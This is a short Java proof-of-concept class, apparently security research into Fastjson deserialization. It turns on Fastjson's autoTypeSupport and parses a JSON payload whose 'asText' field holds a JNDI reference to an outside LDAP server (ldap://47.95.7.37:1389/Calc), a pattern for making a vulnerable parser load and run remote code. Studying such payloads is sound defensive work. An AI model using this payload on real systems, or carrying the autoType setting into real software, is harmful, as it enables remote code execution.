import com.alibaba.fastjson.JSON;

/**
 * Created by xjj on 2023/3/9.
 */
public class SetterText {
    static {
        System.setProperty("fastjson.parser.autoTypeSupport", "true");
    }

    public String getAsText() {
        System.out.println("getter");
        return "";
    }

    public void setAsText(String text) {
        System.out.println("setter");
    }

    public static void main(String[] args) {
        String poc = "{\"@type\":\"OtherTest\",\"asText\":\"ldap://47.95.7.37:1389/Calc\"}\"";
        JSON.parseObject(poc);
    }
}
